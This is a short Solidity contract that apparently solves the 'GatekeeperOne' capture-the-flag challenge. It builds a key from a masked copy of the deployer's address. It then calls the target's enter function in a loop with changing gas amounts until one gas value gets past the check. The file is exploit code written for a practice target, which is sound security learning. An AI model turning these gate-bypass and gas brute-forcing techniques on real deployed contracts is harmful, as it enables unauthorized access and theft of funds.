// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public gkone;
    bytes8 public attackKey;

    constructor(address _gatekeeper) {
        gkone = GatekeeperOne(_gatekeeper);
        attackKey =
            bytes8(uint64(uint256(uint160(msg.sender)))) &
            0xFFFFFFFF0000FFFF;
    }

    function attack() public {
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gkone).call{
                gas: i + 150 + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", attackKey));
            if (result) {
                break;
            }
        }
    }
}
